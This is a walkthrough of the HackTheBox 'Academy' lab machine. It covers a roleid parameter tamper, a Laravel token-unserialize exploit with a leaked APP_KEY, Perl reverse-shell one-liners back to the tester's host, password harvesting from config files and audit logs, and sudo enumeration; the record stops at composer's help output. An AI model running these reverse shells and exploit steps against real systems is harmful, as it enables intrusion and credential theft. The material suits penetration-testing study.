# Academy | HackTheBox

### 1. Scan
```bash
kali@kali:~/Desktop/htb/academy$ sudo nmap -A -p- -T4 10.10.10.215
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 03:58 EST
Nmap scan report for 10.10.10.215
Host is up (0.37s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.80%I=7%D=11/17%Time=5FB3975B%P=x86_64-pc-linux-gnu%r(
SF:NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPO
SF:ptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVer
SF:sionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,
SF:2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0f
SF:Invalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0
SF:1\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCooki
SF:e,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\
SF:"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05
SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY
SF:000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOption
SF:s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/17%OT=22%CT=1%CU=44580%PV=Y%DS=2%DC=T%G=Y%TM=5FB397
OS:9E%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   339.00 ms 10.10.14.1
2   338.97 ms 10.10.10.215

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1742.63 seconds
```
The machine is running SSH and Apache with a hostname of academy.htb. Additionally there looks to be a mysql server up on the x-protocol port, although that is just a best-guess by nmap and will need more investigation.

### 2. Enumerate
Checking out the web server first, it is a HTB Academy site with login and register links.  
Dirbusting the site for .php files shows a few other pagesm including an admin.php which has another login form, presumably to the admin panel of the site.  
On the pages visible from the homepage, I can create an account and login, where you can see the dashboard with all the modules for HTB academy. There is quite a lot to look at, but thankfully a lot of the page's links are not active. When viewing the source for the register page, there is a hidden form value being passed in the POST request called `roleid`.
```html
        <form class="login_form" method="POST" autocomplete="off">
            <br/>
            <br/>
            <img src="images/logo.png" class="center" width="130" height="130">
            <br/>
            <br/>
            <table>
                <tr>
                    <td class="form_text" align="left">&nbsp;&nbsp;&nbsp;Username</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="text" id="uid" name="uid" /></td>
                </tr>
                <tr>
                    <td class="form_text" align="left"><br/>&nbsp;&nbsp;&nbsp;Password</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="password" id="password" name="password" /></td>
                </tr>
                <tr>
                    <td class="form_text" align="left"><br/>&nbsp;&nbsp;&nbsp;Repeat Password</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="password" id="confirm" name="confirm" /></td>
                </tr>
                <input type="hidden" value="0" name="roleid" />
            </table>
            <br/><br/>
            <input type="submit" class="button" value="Register"/> 
            </p>
        </form>
```
The default is 0 - using a proxy I can intercept this request and modify it to be 1 instead and see what the difference in functionality is.  
This is what the request looks like:
```bash
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://academy.htb/register.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close
Cookie: PHPSESSID=ruqnqugb1mrilalv24q7dgtas4
Upgrade-Insecure-Requests: 1

uid=jib1337_1&password=password&confirm=password&roleid=0
```
From here I can try incrementing roleids to see if one yields something different. By changing the roleid to 1, it turns out I can use the account to login to the admin page located at /admin.php. It turns out to be a checklist of actions which were done by admins for the academy site. Only one, "fix issue with dev-staging-01.academy.htb", is listed as pending.  
When visiting this subdomain, there is an error page with a stack page displayed, showing source code and environment variables. The main error is: "The stream or file "/var/www/html/htb-academy-dev-01/storage/logs/laravel.log" could not be opened in append mode: failed to open stream: Permission denied". I can look through some of the page's source code. We also get some information from the displayed variables:
- server_admin : admin@htb
- app_key : base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
- db name: homestead
- db username/password : `homestead:secret`
The first thing I decide to check is disclosed vulnerabilities with the Laravel PHP framework. There are only a few, one of which can result in RCE:  

*.In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack..*
  
One issue is, I don't know the laravel version, and I can't access any files that would display it due to the stack trace being the same for every page.
```bash
msf5 exploit(unix/http/laravel_token_unserialize_exec) > options

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file
   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.215                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                            yes       The target port (TCP)
   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  http://dev-staging-01.academy.htb/            yes       Path to target webapp
   VHOST                                                    no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.158     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(unix/http/laravel_token_unserialize_exec) > run

[+] perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.15.158:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
[*] Started reverse TCP handler on 10.10.15.158:4444 
[*] Exploit completed, but no session was created.
```
So this fails, so does every other payload I try. Luckily there are other versions of this that have been recreated online - I used: https://github.com/aljavier/exploit_laravel_cve-2018-15133.
```bash
kali@kali:~/Desktop/htb/academy/exploit_laravel_cve-2018-15133$ python3 pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=

Linux academy 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
This one works.

### 3. Get a shell
This script can mimic a tty shell with the `-i` flag.
```bash
kali@kali:~/Desktop/htb/academy/exploit_laravel_cve-2018-15133$ python3 pwn_laravel.py -i http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=

Linux academy 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

 Running in interactive mode. Press CTRL+C to exit.
$ whoami
www-data
```
From here I can spawn another shell using Perl for enumeration.
```bash
$ perl -e 'use Socket;$i="10.10.15.158";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```
Catch it in the nc listener.
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.215 46682
bash: cannot set terminal process group (844): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/var/www/html/htb-academy-dev-01/public$ whoami
www-data
```

### 4. Enumerate from foothold
Checking out the files in the http directories, it is all pretty standard at first glance, but there is a lot to go through. I figure a good place to start is trying to access the database. The previously discovered credentials on the error page don't work, but there should still be a way to find out what they are now I'm in a shell. Firstly find the source code for the site's public pages.
```bash
www-data@academy:/var/www/html/academy/public$ ls     
ls
Modules_files
admin-page.php
admin.php
config.php
home.php
images
index.php
login.php
register.php
success-page.php
```
Then find the mysql password inside config.php
```bash
www-data@academy:/var/www/html/academy/public$ cat config.php
cat config.php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy');
?>
```
The database credentials are discovered to be `root:GkEWXn4h34g8qx9fZ1`.  
Logging in:
```bash
www-data@academy:/var/www/html/academy$ mysql -u root --password=GkEWXn4h34g8qx9fZ1
<cademy$ mysql -u root --password=GkEWXn4h34g8qx9fZ1
mysql: [Warning] Using a password on the command line interface can be insecure.


```
This doesn't work. It could be the shell I'm in, so for now I'll have to come back to it.
When doing some recursive grepping in the web folders, there are some more passwords/secrets discovered. Both of these look to be defaults left in there as examples, but the last one looks very promising.
```bash
./vendor/swiftmailer/swiftmailer/tests/smoke.conf.php.default: Defines: A password to authenticate with SMTP (if needed).
./vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $password = 'test1234';
./vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $password = 'SecREt01';
./vendor/fzaninotto/faker/readme.md:    password                // 'k&|X+a45*2['
./.env:DB_PASSWORD=mySup3rP4s5w0rd!!
```
NOTE: Since there are a bunch of huge single-line js files in the code, I filtered them out with some regex: `grep -Rixa '.*password.\{3,400\}' .`.
Looking at other users in /etc/passwd:
```
www-data@academy:/var/www/html/htb-academy-dev-01/public$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh
```

### 5. Escalate to a user
I start trying the password with each user.
```bash
www-data@academy:/var/www/html/htb-academy-dev-01/public$ su - g0blin
su - g0blin
Password: mySup3rP4s5w0rd!!
su: Authentication failure
www-data@academy:/var/www/html/htb-academy-dev-01/public$ su - mrb3n
su - mrb3n
Password: mySup3rP4s5w0rd!!
su: Authentication failure
www-data@academy:/var/www/html/htb-academy-dev-01/public$ su - egre55
su - egre55
Password: mySup3rP4s5w0rd!!
su: Authentication failure
www-data@academy:/var/www/html/htb-academy-dev-01/public$ su - cry0l1t3
su - cry0l1t3
Password: mySup3rP4s5w0rd!!


```
At this point the issue I saw when logging into SQL happens again - my shell just dies when trying to access a user account. After some research the fix to this is to respawn my shell but this time using /bin/sh, then spawn a tty using python.
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.215 46730
/bin/sh: 0: can't access tty; job control turned off
$ which python
$ which python3
/usr/bin/python3
$ python3 -c "import pty; pty.spawn('/bin/bash');"
www-data@academy:/var/www/html/htb-academy-dev-01/public$ su - cry0l1t3
su - cry0l1t3
Password: mySup3rP4s5w0rd!!

$ whoami
whoami
cry0l1t3
```

### 6. Enumerate from user
There was already someone's leftover enum script in the home folder where I landed, so to start with I just ran that. (see smartenum_out.txt)
```bash
$ ls
lse.sh  user.txt
$ ./lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges: mySup3rP4s5w0rd!!                                                                                     
mySup3rP4s5w0rd!!
---
                                                                                                                                                                                                   
 LSE Version: 2.10                                                                                                                                                                                 

        User: cry0l1t3
     User ID: 1002
    Password: ******
        Home: /home/cry0l1t3
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
       umask: 0002

    Hostname: academy
       Linux: 5.4.0-52-generic
Distribution: Ubuntu 20.04.1 LTS
Architecture: x86_64
```
Now since my shell is fixed, I should be able to access the SQL database finally. (Note: I SSH'd into the machine from here on to continue enum)
```bash
cry0l1t3@academy:~$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 188
Server version: 8.0.22-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| academy            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use academy
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_academy |
+-------------------+
| users             |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+--------+---------------------+
| id | username | password                         | roleid | created_at          |
+----+----------+----------------------------------+--------+---------------------+
|  5 | dev      | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 |
| 11 | test8    | 5e40d09fa0529781afd1254a42913847 |      0 | 2020-08-11 00:44:12 |
| 12 | test     | 098f6bcd4621d373cade4e832627b4f6 |      0 | 2020-08-12 21:30:20 |
| 13 | test2    | ad0234829205b9033196ba818f7a872b |      1 | 2020-08-12 21:47:20 |
| 14 | tester   | 098f6bcd4621d373cade4e832627b4f6 |      1 | 2020-08-13 11:51:19 |
| 15 | dd       | 1aabac6d068eef6a7bad3fdf50a05cc8 |      0 | 2020-11-19 06:13:14 |
| 16 | admin    | 4124bc0a9335c27f086f24ba207a4912 |      0 | 2020-11-19 06:28:35 |
| 17 | admin1   | 4124bc0a9335c27f086f24ba207a4912 |      1 | 2020-11-19 06:28:50 |
| 18 | nope     | 4101bef8794fed986e95dfb54850c68b |      0 | 2020-11-19 06:41:33 |
| 19 | a        | 0cc175b9c0f1b6a831c399e269772661 |      0 | 2020-11-19 06:43:00 |
+----+----------+----------------------------------+--------+---------------------+
```
The password for dev is `mySup3rP4s5w0rd!!`, and the rest look to be other player's accounts, so this doesn't provide anything new. After that I move back to studying the output from the enumeration script.
```bash
...
==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... yes!
[*] usr020 Are there other users in an administrative groups?.............. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
...

cry0l1t3@academy:/var/log$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```
The user is in the adm group, which is used for users to perform system monitoring tasks. This gives the user access to /var/log. After looking into sensitive log files on linux, I learn that certain shell commands are stored in the audit logs, with sensitive data encoded in hex.
```bash
cry0l1t3@academy:/var/log$ grep -Rixa '.*type=tty.*\{1,400\}' audit/.
audit/./audit.log.3:type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
audit/./audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
audit/./audit.log.3:type=TTY msg=audit(1597199304.778:89): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=77686F616D690A
audit/./audit.log.3:type=TTY msg=audit(1597199308.262:90): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A
audit/./audit.log.3:type=TTY msg=audit(1597199317.622:93): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=2F62696E2F62617368202D690A
audit/./audit.log.3:type=TTY msg=audit(1597199443.421:94): tty pid=2606 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
audit/./audit.log.3:type=TTY msg=audit(1597199533.458:95): tty pid=2643 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
audit/./audit.log.3:type=TTY msg=audit(1597199575.087:96): tty pid=2686 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=3618790D
audit/./audit.log.3:type=TTY msg=audit(1597199606.563:97): tty pid=2537 uid=1002 auid=0 ses=1 major=4 minor=1 comm="bash" data=63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740D
audit/./audit.log.3:type=TTY msg=audit(1597199606.567:98): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A
audit/./audit.log.3:type=TTY msg=audit(1597199610.163:107): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=2F62696E2F62617368202D690A
audit/./audit.log.3:type=TTY msg=audit(1597199616.307:108): tty pid=2712 uid=1002 auid=0 ses=1 major=4 minor=1 comm="bash" data=6973746F72790D686973746F72790D657869740D
audit/./audit.log.3:type=TTY msg=audit(1597199616.307:109): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A
```
The most interesting piece of data in here is the data attached to the su command. This looks like a password: `mrb3n_Ac@d3my!`.

### 7. Lateral movement
I SSH into the other user account.
```bash
kali@kali:~$ ssh mrb3n@academy.htb
mrb3n@academy.htb's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 19 Nov 2020 08:21:36 AM UTC

  System load:             0.19
  Usage of /:              45.1% of 15.68GB
  Memory usage:            26%
  Swap usage:              0%
  Processes:               199
  Users logged in:         1
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb9:b3ec

  => There is 1 zombie process.

 * Introducing self-healing high availability clustering for MicroK8s!
   Super simple, hardened and opinionated Kubernetes for production.

     https://microk8s.io/high-availability

0 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Nov 19 07:48:52 2020 from 10.10.14.209
$ bash
mrb3n@academy:~$
```

### 8. More enumeration
First thing I check is sudo privileges:
```bash
mrb3n@academy:~$ sudo -l

Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```
Checking out composer
```bash
mrb3n@academy:~$ composer
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
   ______
  / ____/___  ____ ___  ____  ____  ________  _____
 / /   / __ \/ __ `__ \/ __ \/ __ \/ ___/ _ \/ ___/
/ /___/ /_/ / / / / / / /_/ / /_/ (__  )  __/ /
\____/\____/_/ /_/ /_/ .___/\____/____/\___/_/
                    /_/
Composer 1.10.1 2020-03-13 20:34:27

Usage:
  command [options] [arguments]

Options:
  -h, --help                     Display this help message
  -q, --quiet                    Do not output any message
  -V, --version                  Display this application version
      --ansi                     Force ANSI output
      --no-ansi                  Disable ANSI output
  -n, --no-interaction           Do not ask any interactive question
      --profile                  Display timing and memory usage information
      --no-plugins               Whether to disable plugins.
  -d, --working-dir=WORKING-DIR  If specified, use the given directory as working directory.
      --no-cache                 Prevent use of the cache
  -v|vv|vvv, --verbose           Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug

Available commands:
  about                Shows the short information about Composer.
  archive              Creates an archive of this composer package.
  browse               [home] Opens the package's repository URL or homepage in your browser.
  check-platform-reqs  Check that platform requirements are satisfied.
  clear-cache          [clearcache|cc] Clears composer's internal package cache.
  config               Sets config options.
  create-project       Creates new project from a package into given directory.
  depends              [why] Shows which packages cause the given package to be installed.
  diagnose             Diagnoses the system to identify common errors.
  dump-autoload        [dumpautoload] Dumps the autoloader.
  exec                 Executes a vendored binary/script.
  fund                 Discover how to help fund the maintenance of your dependencies.
  global               Allows running commands in the global composer dir ($COMPOSER_HOME).
  help                 Displays help for a command
  init                 Creates a basic composer.json file in current directory.
  install              [i] Installs the project dependencies from the composer.lock file if present, or falls back on the composer.json.
  licenses             Shows information about licenses of dependencies.
  list                 Lists commands
  outdated             Shows a list of installed packages that have updates available, including their latest version.
